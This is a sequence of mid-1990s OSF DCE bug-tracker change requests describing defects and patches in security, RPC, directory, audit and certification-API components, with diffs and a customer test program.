Reported Date                 : 12/3/96
Found in Baseline             : 1.2.2b5
Found Date                    : 12/3/96
Severity                      : B
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : pkc_api.h
Diff supplied by              : provider
Diff release                  : 1.2.2b5
Sensitivity                   : public

[12/3/96 public]

File pkc_api.h, the Certification API header file, contains some comments
using the C++ comment syntax (i.e. introduced by "//").  This header is
intended for use with either C or C++, so these comments must be changed
to use C syntax.

Diffs as below ("<" denotes current file, ">" denotes fixes)

188,190c188,190
<    UNTRUSTED,     // No trust (e.g. unauthenticated)
<    DIRECT_TRUST,  // Direct trust via third party (e.g. authenticated registry
)
<    CERTIFIED_TRUST    // Trust certified by caller's trustbase.
---
>    UNTRUSTED,     /* No trust (e.g. unauthenticated) */
>    DIRECT_TRUST,  /* Direct trust via third party (e.g. authenticated registry
) */
>  CERTIFIED_TRUST    /* Trust certified by caller's trustbase. */
198,201c198,202
<   trust_type_t trust_type;  // The style of trust
<   char missing_crls;      // True if one or more CRLs were missing
<   char revoked;             // True if any certificate has been revoked (even
<                             // if it were still valid at the retrieval time).
---
>   trust_type_t trust_type;  /* The style of trust */
>   char missing_crls;      /* True if one or more CRLs were missing */
>   char revoked;             /* True if any certificate has been revoked (even
>                              * if it were still valid at the retrieval time).
>                              */



CR Number                     : 13674
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : klist
Short Description             : klist misprints years >= 2000
Reported Date                 : 12/2/96
Found in Baseline             : 1.1
Found Date                    : 12/2/96
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/krb5/clients/klist/klist.c
Diff supplied by              : user
Diff release                  : 1.1
Sensitivity                   : public

[12/2/96 public]

Dates are printed by klist using the format %02d for a struct tm tm_year
field, which causes 2001 to print as 101, and so on.  Dates are also in the
format YY/MM/DD:HH:MM:SS, which is not A Good Thing.

The diff included here changes the format to YYYY-MM-DD-HH:MM:SS, which
conforms to the DTS format as described in Appendix D of the Admin Guide -
Core Components.

*** security/krb5/clients/klist/klist.c
--- 13.2	1996/12/02 16:27:20
***************
*** 277,284 ****
      struct tm *stime;
      stime = localtime((time_t *)&tv);
  
!     printf("%02d/%02d/%02d:%02d:%02d:%02d",
!            stime->tm_year,
             stime->tm_mon + 1,
             stime->tm_mday,
             stime->tm_hour,
--- 298,305 ----
      struct tm *stime;
      stime = localtime((time_t *)&tv);
  
!     printf("%04d-%02d-%02d-%02d:%02d:%02d",
!            stime->tm_year + 1900,
             stime->tm_mon + 1,
             stime->tm_mday,
             stime->tm_hour,



CR Number                     : 13673
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : psm
Short Description             : DCE client requires C++ runtime
Reported Date                 : 11/26/96
Found in Baseline             : 1.2.2b5
Found Date                    : 11/26/96
Severity                      : D
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : security/psm/Makefile, security/psm/domestic/sec_pvtkey_registered_keystores.c
Diff supplied by              : provider
Diff release                  : 1.2.2b5
Sensitivity                   : public

[11/26/96 public]

Currently, the DCE 1.2.2 runtime requires the presence of a C++ runtime.  
This is because the PKSS client-side is written in C++, and the PSM contains
an array of entrypoint vectors (one for each keystore), one of which points
to PKSS entrypoints.  While C++ runtimes aren't uncommon, this OT documents
a way of lifting this restriction (at the cost of eliminating PKSS support).


security/psm/domestic/sec_pvtkey_registered_keystores.c:
--------------------------------------------------------

On line ~74, the code:
> #ifdef HPUX
should be changed to:
> #if defined(HPUX) || defined(NO_PKSS)

security/psm/Makefile:
----------------------

On line ~315, after the line:
> CFLAGS  = -DOSF_DCE ${DCEPATHS} -D_BSD -DBSD ${${TARGET_MACHINE}_CFLAGS}
insert the line:
> CFLAGS += -DNO_PKSS



CR Number                     : 13672
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : 
Short Description             : Adopting orphans should be
protected separately from creating principals.
Reported Date                 : 11/20/96
Found in Baseline             : 1.1
Found Date                    : 11/20/96
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/20/96 public]

This is from Tyson Richmond(GTE): he is worried about the ability of an
admin to adopt orphans. He thinks that "relatively weakly empowered" admins
would have too much power since they would be able to adopt orphaned UUIDs
with "large" permission sets since it is difficult to find all the ACL
instances and expunge them. I suggested the usual precaution of (only)
using groups in ACLs, but in addition to that, he would like to see the
ability of an admin to adopt orphaned UUIDS, to be controlled by an
additional ACL permission, e.g on the principal, group and org directories.



CR Number                     : 13670
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : src/directory/cds/library/
Short Description             : DCE is not configurable with
X.500 cell name
Reported Date                 : 11/14/96
Found in Baseline             : 1.2.1
Found Date                    : 11/14/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/14/96 public]

A support customer reported the following problem:
==================================================
Component: DCE CDS, , , 
Client Hardware: -
Client Software: -
Server Hardware: SNi RM
Server Software: DCE(Reiant UNIX) V2.0 (= OSF DCE V1.2.1
Compiler: -
Severity: Critical
Date of First Occurrence: 96.10.15
One Line Description: DCE is not configurable with a X.500 cell name
Full Description: using cell name c=xx/o=yyy/ou=zzz does not work.
Result: dce_config aborts with:
...
        Enter the name of your cell (without /.../): c=de/o=test/ou=klein
/opt/dcelocal/bin/getcellname: cannot get cell name, 0x0000ff01l
S:****** Starting dced...
S:****** Initializing dced...
1996-10-30-13:11:25.940+01:00I----- dced FATAL dhd general main.c 649 0x04f95718
Initialization (global data) failed, status=0x0000ff01.
ERROR:   dced -i failed to start.  Continuing will return to the Main Menu.
The first equsl sign seems to be critical:

# cat dce_cf.db
cellname /.../c=de/o=test/ou=klein
hostname  hosts/PGTR0114
krb5_ccache_vno 1
gen_v1_pac true
krb5_kt_vno 1
# getcellname
getcellname: cannot get cell name, 0x0000ff01l

# cat dce_cf.db
cellname /.../cde/o=test/ou=klein        !!!! "cde" 
hostname  hosts/PGTR0114
krb5_ccache_vno 1
gen_v1_pac true
cellname /.../c=de/o=test/ou=klein
hostname  hosts/PGTR0114
krb5_ccache_vno 1
gen_v1_pac true
krb5_kt_vno 1
# getcellname
/.../cde/o=test/ou=klein
#
A return value <> DNS_SUCCESS is seen in routine dnsExpandStrFull()
[src/directory/library/dnsexpandstrfull.c] during dce_config.
Routine cds_cvtCDSFullToOpq() [src/directory/cds/library/\
dnscvtcdsfull.c] shows up code changes since V1.0.3 (our
latest port):

diff /home/klein/sandboxes/dce/dcetest/src/directory/cds/\
library/dnscvtcdsfull.c [ = 1.0.3] with:
/home3/dce/V1.2.1/dce/src/directory/cds/library/\
dnscvtcdsfull.c [ = 1.2.1 ]
368,370c313,314
< static int
< cds_cvtCDSFullToOpq (data_p)
<     data_t    *data_p;
---
> static int
> cds_cvtCDSFullToOpq (data_t *data_p)
389c333
<       status = DNS_INVALIDNAME;       /* unrecognized character */
---
>       status = CDS_INVALIDNAME;       /* unrecognized character */
395,400c339,344
<       INS16(data_p->full_p->fn_length,
<           data_p->d2s.fnLength + sizeof(NULLSIMPLENAME_t));
<       if (data_p->d2s.fnLength > DNS_OPQ_FNAME_MAX)
<         status = DNS_INVALIDNAME;
<     } else if (data_p->full_p && (status == DNS_SUCCESS))
<       status = DNS_NOROOM;
---
>       data_p->d2s.fnLength += sizeof(NULLSIMPLENAME_t);
>       INS16(data_p->full_p->fn_length, data_p->d2s.fnLength);
>       if (sizeof(data_p->full_p->fn_name) < data_p->d2s.fnLength)
>         status = CDS_INVALIDNAME;
>     } else if (data_p->full_p && (status == CDS_SUCCESS))
>       status = CDS_NOROOM;

Maybe some effect on our problem?

Proposed Solution: -



CR Number                     : 13669
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 10346
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : rpc/runtime
Short Description             : rpc_mgmt_ep_elt_inq_next does
not ignore protocol towers
Reported Date                 : 11/14/96
Found in Baseline             : 1.1
Found Date                    : 11/14/96
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : comep.c
Diff supplied by              : osf
Diff release                  : 1.1
Sensitivity                   : public

[11/14/96 public]

A support customer has reported the following problem.
===========================================================

DCE Component: DCE RPC
Component: , , 
Client Hardware: 
Client Software: 
Server Hardware: 
Server Software: WinNT 4.0
Compiler: 
Severity: Enhancement
Date of First Occurrence: Today
One Line Description: rpc_mgmt_ep_elt_inq_next does not ingore protocol towers it does not understand
Full Description: While enumerating endpoints rpc_mgmt_ep_elt_inq_next returns
an error if status from rpc_tower_to_binding fails with
rpc_s_not_rpc_tower status. Because there may be endpoint
mappers ( eg: Microsoft endpoint mapper "rpcss" ) that 
support towers that OSF reference implementation fails to
understand, it is desirable that those be ignored while
enumerating.

Without this change
one can not configure DCE clients into a cell with security
server running on NT because configuration scripts
typically identify the security server object id using
'rpccp show mapping' that fails.

Repeat By: 
Proposed Solution: 
 Ignore rpc_s_not_rpc_tower error in the above context.

[1/6/97 public]

  Gradient verified the following fix works.  This fix should be
merged into DCE 1.1 Maintenance release, DCE 1.2.1 Maintenance release,
as well as DCE 1.2.2 Maintenance release (after 1.2.2 is released).
Context diff was made agaist the current DCE 1.1 Maintenance source.

% bdiff -c comep.c
./rpc/runtime/comep.c
Comparing the file in your sandbox with revision 1.1.77.1.
*** 1.1.77.1    1997/01/03 20:47:39
--- /u0/rcs_trees/dce/rcs/#odexm013076/comep.c  1997/01/06 23:44:16
***************
--- 8,13 ----
***************
*** 1159,1164 ****
--- 1156,1162 ----
               * If the conversion was ok, we have a supported tower.
               * If the tower is of an unsupported protseq, we filter it out.
               * Any other status is a problem, so return.
+            * OT13669: If the tower is not recognized, we ignore it.
               */
              if (*status == rpc_s_ok)
              {
***************
*** 1166,1172 ****
              }
              else
              {
!                 if (*status != rpc_s_protseq_not_supported)
                  {
                      return;
                  }
--- 1164,1171 ----
              }
              else
              {
!                 if ((*status != rpc_s_protseq_not_supported) &&
!                   (*status != rpc_s_not_rpc_tower))
                  {
                      return;
                  }



CR Number                     : 13668
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : aud
Subcomponent Name             : audit/libaudit/evt_filter.c
Short Description             : DIFF: Audit Filtering is broken for
all platforms
Reported Date                 : 11/14/96
Found in Baseline             : 1.2.1
Found Date                    : 11/14/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : evt_filter.c
Diff supplied by              : provider
Diff release                  : 1.2.2
Sensitivity                   : public

[11/14/96 public]

A support customer reported the following problem.
I have verified by code inspection, that this problem
exists in the 1.1-maint, 1.2.1 and 1.2.2 code base.

=================================================
technology area is DCE.1.1
Technology component is DCE Security
Severity level Critical
client hardware : 
client software : OSF 1.2.1
server hardware : 
server software : 
compiler : 
On Line Description :  Audit filtering broken for all platforms
Full Description : 
 Matching of multiple event classes to a guide list is
 broken. In src/security/audit/libaudit/evt_filter.c:
 aud_esl_match_ecs() the value of guide_ecs is always 
 null for all but the first event class being compared.
How to recreate the problem : 
Problem solution :  Move the assignment 
   ecs_ptr = guide_ecs;

 into the for loop

[01/07/97 public]
Would you please append a section of how to create the problem??? 
This segment of code have been there since the first release. I
would like to understand the problem well before making the change.

[01/08/97 public]

Here is the customer's answer:

> If you look at the code carefully you will see the problem. Let me explain.
> The  evt_filter.c:aud_esl_match_ecs() code is attempting to do a many-many
> match of 
> list of event classes to list of audit esl guides. The original code
> compares the
> guide list against the first event class only. This is a bug.

> I believe I had problem generating audit trail using a simple test I wrote.
> This test has some win32 isms but can be easily modified for other
> platforms...

> I attach the test to this message.

> /nb


/*
 * @GRADIENT_COPYRIGHT@
 */
/*
 * 
 * $Source: /project/ot/dce/d01/d36/RCS/c013668,v $
 * 
 * HISTORY
 * $Log:	c013668,v $
# Revision 1.4  97/01/09  15:54:44  root
# changed fields: Short Description  Affected File(s)  Diff supplied by  Diff release  Responsible Engr.  Resp. Engrs Company   new/changed/deleted note(s) [axg 11/14/96 public] [trant 01/09/97 public] [axg 11/14/96 public]
# 
# Revision 1.3  97/01/08  21:07:52  root
# changed fields:  new/changed/deleted note(s) [axg 01/08/97 public]
# 
 * Revision 1.21.1.1  96/09/23 21:57:42  kevin
 * Propagated 1.1 Source
 * Revision 1.10.1.2  96/09/21 20:29:12  bhandaru
 * fix bug in filtering and log alarms to evtlog
 * Revision 1.10.1.1  96/09/21 19:17:10  bhandaru
 * Create 1.10.1 branch
 * Revision 1.10  96/09/21 19:17:10  bhandaru
 * Create 1.10 version 
 * Revision 1.0  96/09/21 19:17:09  bhandaru
 * *** empty log message ***
 */

/* This module is a simple test of event filtering. Should run this
 * after starting audit and setting up default filters. You can
 * look at the audit trail in <dcelocal>/var/security/audtest_trail
 * using dcecp. Must be logged in as cell_admin before running - nb
 */

#ifdef WIN32
#include <windows.h>
#include <winbase.h>
#endif
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <tet_api.h>
#include <dce/sec_login.h>
#include <dce/dce_error.h>
#include <dce/audit.h>
#include <dce/dce_error.h>
#include <time.h>

#define CHKST(st) if ((st) != 0) { \
    int einqst; \
    char buf[1024]; \
    dce_error_inq_text(st, buf, &einqst); \
    fprintf(stderr, "Bad status at line %d: (status 0x%08x) : %s \n", __LINE__, (st), buf); \
    return (-1) ; \
} 

int main ( int argc, char **argv )
{
dce_aud_trail_t st_aud_trail;
dce_aud_rec_t   st_aud_rec = NULL;
dce_aud_ev_info_t evi;
error_status_t st;
char *trail_path;
unsigned32 cond, options;
int success;
char *audonenv = "DCEAUDITOFF=" ;
char *audfilteronenv = "DCEAUDITFILTERON=1" ;

    rpc_server_use_all_protseqs(10, &st);
    CHKST(st);

    success = ((argc > 1) && (strcmp(argv[1], "success") == 0));
    if ( success ) {
	cond = aud_c_esl_cond_success ;	
    } else cond = aud_c_esl_cond_failure;
    options = 0 ; /* aud_c_evt_always_log */ ;

     /* Turn on auditing */
     _putenv(audonenv);

     /* Turn on audit filtering */
    _putenv(audfilteronenv);
#define ST_AUDIT_TRAIL_PATH "/opt/dcelocal/var/security/audtest_trail"
    trail_path =  DCEPathCreate(ST_AUDIT_TRAIL_PATH);


    /* Open trail for sec events - see security h/sec_aud_events.h */
#define ST_AUD_FIRST_EVT_NUMBER 0x0100
#define ST_AUD_NUM_OF_EVTS 58
    dce_aud_open(aud_c_trl_open_write, trail_path , 
        ST_AUD_FIRST_EVT_NUMBER, ST_AUD_NUM_OF_EVTS, &st_aud_trail, &st);
    CHKST(st);

    DCEPathFree(trail_path);

#define PGO_ADD  0x0114
    dce_aud_start_with_name(PGO_ADD, (unsigned_char_t *) "cell_admin", NULL,
                     options, aud_c_esl_cond_unknown, &st_aud_rec, &st);
    CHKST(st);
    if (st_aud_rec) {
	evi.format = aud_c_evt_info_long_int;
	evi.data.long_int = sec_rgy_domain_person;
	dce_aud_put_ev_info(st_aud_rec, evi, &st);
        CHKST(st);

	evi.format = aud_c_evt_info_char_string;
	evi.data.char_string = "cell_admin";
	dce_aud_put_ev_info(st_aud_rec, evi, &st);
        CHKST(st);
    }

    dce_aud_commit(st_aud_trail, st_aud_rec, 
	aud_c_evt_commit_sync_no_wait, 1, cond , &st);
    CHKST(st);
    
    dce_aud_close(st_aud_trail, &st);
    CHKST(st);

    return 0;
}


--=====================_852754694==_
Content-Type: text/plain; charset="us-ascii"

[01/09/97 public]
Thank for the test case. 

Here is the diff: 

101,102d100
<     ecs_ptr = guide_ecs;
< 
103a102
>         ecs_ptr = guide_ecs;



CR Number                     : 13666
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : 
Short Description             : rutc_gettime manager routine
lacks status argument
Reported Date                 : 11/14/96
Found in Baseline             : 1.2.1
Found Date                    : 11/14/96
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : dced/server/rutcops.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/14/96 public]

dced/idl/rutc.acf brings in a new status parameter to rutc_gettime.
Yet this argument is not declared in the rutc_gettime function
definition.  This causes link errors.  I've worked around it
by inserting "error_status *st" in the rutc_gettime definition in 
rutcops.c



CR Number                     : 13665
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13620
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : gds/dua/switch
Short Description             : Error in reading Attr/Value in CDS using XDS API
Reported Date                 : 11/13/96
Found in Baseline             : 1.2.2b5
Found Date                    : 11/13/96
Severity                      : B
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : d21_cdsmis.c, d21_cdsrd.c
Diff supplied by              : user
Diff release                  : 1.2.2b5
Sensitivity                   : public

[11/13/96 public]



Following is a description of two problems discovered in the
XDS-CDS implementation on the IBM reference platform during the 
development of Certification API (CAPI --a new public key component of 
R1.2).  This OT cross-references OT 13620. OT 13620 contains fixes
for additional problems found in the XDS-CDS implementation.
However, only those described below are required for running
CAPI tests.


During the development of Certification API on the IBM reference 
platform, we found two problems with the XDS-CDS implementation:

1. Applications cannot read "attribute/values" of the CDS root 
   directory using the X500 API (ds_read*)

2. CDS Attribute  values  of type "dns_byte"  are not returned correctly 
   from the X500 API. In this case, the function strncpy was being  used  
   to return the value returned from CdsReadAttrValue() call. Since 
   strncpy  will stop copying the bytes read from CDS after encountering 
   a \0, and pad the remaining bytes with \0, the value read may not
   match the bytes stored in CDS.  The correct solution is to use memcpy.


In order to run the Certification API tests correctly with CDS as the 
back-end on the IBM reference platform, it is important to apply the diffs 
shown below to  two files ---
(1) d21_cdsmis.c and (2) d21_cdsrd.c in directory 
"src/directory/gds/dua/switch" in the R1.2 distribution.


=================================================================
Note:
<  Indicates our fixes to the source files in the R1.2 distribution
>  Indicates the lines in the sources in the R1.2 distribution.



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
1. Diff for  src/directory/gds/dua/switch/d21_cdsmis.c:

303,306c303
<         /* mbg: DEC fix: If the value is dns_byte, then  */
<         /* we cannot stop at the first \0 in the value; */
<         /* therefore, strncpy needs to be replaced with memcpy */ 
<                       memcpy ((char *)oct_value, dns_value->val_u.val_byte.byte_p, len);
---
>                       strncpy ((char *)oct_value, dns_value->val_u.val_byte.byte_p, len);


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
2. Diff for src/directory/gds/dua/switch/d21_cdrd.c:

647,651c647
<                 /* mbg: DEC fix..  fsLocStat can be DNS_ROOTLOST */
<                 /* when looking up any CDS root directory attribute */
<                 /* therefore, it is better to check whether */
<                 /* r_code != DNS_SUCCESS as well */
<               if ((r_code != DNS_SUCCESS) || (flags->fsLocStat == DNS_UNKNOWNENTRY)) {
---
>               if (flags->fsLocStat == DNS_UNKNOWNENTRY) {
1414,1416c1410
<                  /* mbg: DEC fix: Once again, fsLocStat can be DNS_ROOTLOST */
<            /* therefore it is better to check r_code != DNS_SUCCESS as well */
<               if (r_code != DNS_SUCCESS || flags->fsLocStat == DNS_UNKNOWNENTRY) {
---
>               if (flags->fsLocStat == DNS_UNKNOWNENTRY) {
1423,1426d1416
<                       
<                         /* mbg: decfix: It is required to clearHandle */
<                         /* before using it again for another operation */
<                         cdsClearHandle(handle);

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%



CR Number                     : 13664
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : certapi
Short Description             : crypto switch broken
Reported Date                 : 11/8/96
Found in Baseline             : 1.2.2b5
Found Date                    : 11/8/96
Severity                      : B
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : pkc_crypto_reg.cxx,
                                             pkc_crypto_alg_rsamd2.cxx
                                             pkc_crypto_alg_rsamd5.cxx
                                             pkc_crypto_alg_rsamd5.h
                                             pkc_crypto_preload.cxx
Diff supplied by              : provider
Diff release                  : 1.2.2b5
Sensitivity                   : public

[11/8/96 public]
The two certificate signature algorithms supported by the certification API
(RSA-with-MD2 and RSA-with-MD5) are registered with incorrect OIDs.  This
should have the effect of breaking interoperability with certificates created
by other (non-DCE-based) certification authorities.  However, there is also
a bug in the switch code itself that always directs signature verification
operations to the MD2 module, regardless of the signature algorithm specified
in the certificate.

[11/12/96 public]
The fixes are as follows:

--------------------------------------------------------
File security/pkc/capi/crypto/pkc_crypto_alg_rsamd2.cxx:
--------------------------------------------------------
Line ~56:
The array rsa_md2_oid should be declared as follows:

>  unsigned char rsa_md2_oid[9] = {
>     0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x02
>  };

--------------------------------------------------------
File security/pkc/capi/crypto/pkc_crypto_alg_rsamd5.cxx:
--------------------------------------------------------
Line ~56:
The array rsa_md5_oid should be declared as follows:

>  unsigned char rsa_md5_oid[9] = {
>     0x2a, 0x86, 0x48, 0x86, 0xf7, 0x0d, 0x01, 0x01, 0x04
>  };

--------------------------------------------
File security/pkc/h/pkc_crypto_alg_rsamd5.h:
--------------------------------------------
Line ~18:

The two lines:

>#ifndef PKC_CRYPTO_ALG_RSAMD2_
>#define PKC_CRYPTO_ALG_RSAMD2_
 
should be changed to:

>#ifndef PKC_CRYPTO_ALG_RSAMD5_
>#define PKC_CRYPTO_ALG_RSAMD5_
 

-------------------------------------------------
File security/pkc/capi/crypto/pkc_crypto_reg.cxx:
-------------------------------------------------
Line ~245, constructor for pkc_signature_algorithm_int_t:

Replace the lines:

>        state = ALG_CLOSED;
>        next = NULL;
>        prev = NULL;
>        implementation = *imp;
 
with:

>        state = ALG_CLOSED;
>        implementation = *imp;


 
Line ~266, routine find_alg:
The following code:

>    done = ((algorithm = algorithm_list) != NULL);
>
>    while (!done) {
>        if (algorithm->check(oid)) done = 1;

should be replaced with:

>    done = ((algorithm = algorithm_list) == NULL);
>
>    while ((algorithm != NULL) && !done) {
>        if (algorithm->check(oid)) done = 1;


-----------------------------------------------------
File security/pkc/capi/crypto/pkc_crypto_preload.cxx:
-----------------------------------------------------

The initialiser for the array pkc_preloaded_algorithms 
at line ~56 should be changed from:

>pkc_signature_algorithm_t * pkc_preloaded_algorithms[] = {
>    &pkc_crypto_alg_rsamd2,
>    &pkc_crypto_alg_rsamd2,
>    NULL
>};

to:

>pkc_signature_algorithm_t * pkc_preloaded_algorithms[] = {
>    &pkc_crypto_alg_rsamd2,
>    &pkc_crypto_alg_rsamd5,
>    NULL
>};



CR Number                     : 13663
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : gssapi
Short Description             : Makefile invokes SAMS wrong
Reported Date                 : 11/7/96
Found in Baseline             : 1.2.2
Found Date                    : 11/7/96
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/7/96 public]

The Makefile in security/gssapi is wrong.  It has
	${DEFTOOLBASE}sams ...
When it should be
	${SAMS} ...

[11/8/96 public]

Actually, no, it shouldn't invole SAMS directly, it should set SAMSFILES
and put the files it wants to build in OTHERS...

[11/08/96 public]
Oops, yeah.   That would also solve the overkill that it currently has
of generating *all* the sams output files... :)



CR Number                     : 13662
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 13045
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dced
Subcomponent Name             : database files
Short Description             : 1.1/1.2.1 version mismatch
Reported Date                 : 11/6/96
Found in Baseline             : 1.2.1
Found Date                    : 11/6/96
Severity                      : A
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[11/6/96 public]

Dick Sikkema has found a problem with the fix for OT 13045.
Licensees with installed 1.1 hosts will fail when a 1.2.1 (or
later) dced tries to start up because the IDL file describing
the backing store has a new major version number.

Our planned fix is to add code that traps the "unknown interface"
code, and rewrite the old->new format on the fly.



CR Number                     : 13661
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : dsa
Short Description             : DSA enforces use of obsolete signature algorithms
Reported Date                 : 10/25/96
Found in Baseline             : 1.2
Found Date                    : 10/25/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/25/96 public]
The X.500 DSA currently restricts the signature algorithm used in
certificates stored in the directory to be one of "RSA", "Square-mod-N",
or "RSA-with-square-mod-N".  While these are the three algorithms mentioned
in X.509 (V1, 1988), they are not suitable as certificate signature
algorithms.  "Square-mod-N" isn't a signature algorithm, it's a hash
function; "RSA" isn't a signature algorithm, it's an encryption algorithm.

Square-mod-N is a valid signature algorithm, but it has known weaknesses,
and has been deprecated in a more recent version of X.509.  Even if
RSA-with-Square-mod-N were still considered a good algorithm, the
directory should not be constraining the use of particular algorithms.



CR Number                     : 13660
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : gds
Subcomponent Name             : dsa
Short Description             : ENCODING_STRING syntax not supported
Reported Date                 : 10/25/96
Found in Baseline             : 1.2
Found Date                    : 10/25/96
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/25/96 public]
The DSA doesn't the syntax "OM_S_ENCODING_STRING" for attribute values.

When instructed to set the value of an attribute in the directory, the DSA
verifies that the presented value is of an appropriate type for the attribute.
However, in addition to accepting structured values, the DSA should accept
ASN.1-encoded values, specified via the syntax OM_S_ENCODING_STRING.
Currently, it rejects the use of this syntax for attributes such as 
"Certificate".



CR Number                     : 13659
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : Pickling:  Major and Minor versions mixed in pickling.c
Reported Date                 : 10/21/96
Found in Baseline             : 1.1
Found Date                    : 10/21/96
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/21/96 public]

IBM CMVC defect 25076 is opened for tracking the pickling problem: 


prefix        p
name          25076
reference     
abstract      Pickling:  Major and Minor versions mixed in pickling.c
duplicate     

state         working                     priority      investigate         
severity      3                           target                            
age           28

compName      rpc.idl.src                 answer        error               
release       os2dce21                    symptom       other               
envName                                   phaseFound    osf                 
level                                     phaseInject                       

addDate       1996/09/23 11:26:14         assignDate    1996/09/24 09:59:16 
lastUpdate    1996/10/21 14:00:28         responseDate  1996/10/09 11:47:57 
endDate                                

ownerLogin    cwang                       originLogin   piers               
ownerName     Cathy Wang                  originName    Hendrie, Piers *VEND
ownerArea     AUS/lwqs                    originArea    AUS/lggs            

tracks:
    releaseName           state           addDate    lastUpdate target
    --------------------- --------------- ---------- ---------- ---------------
    aixdce21              fix             1996/10/17 1996/10/17                
    os2dce21              fix             1996/10/17 1996/10/17                

verify:
    type            state           addDate    lastUpdate userLogin       duplicate
    --------------- --------------- ---------- ---------- --------------- ---------------
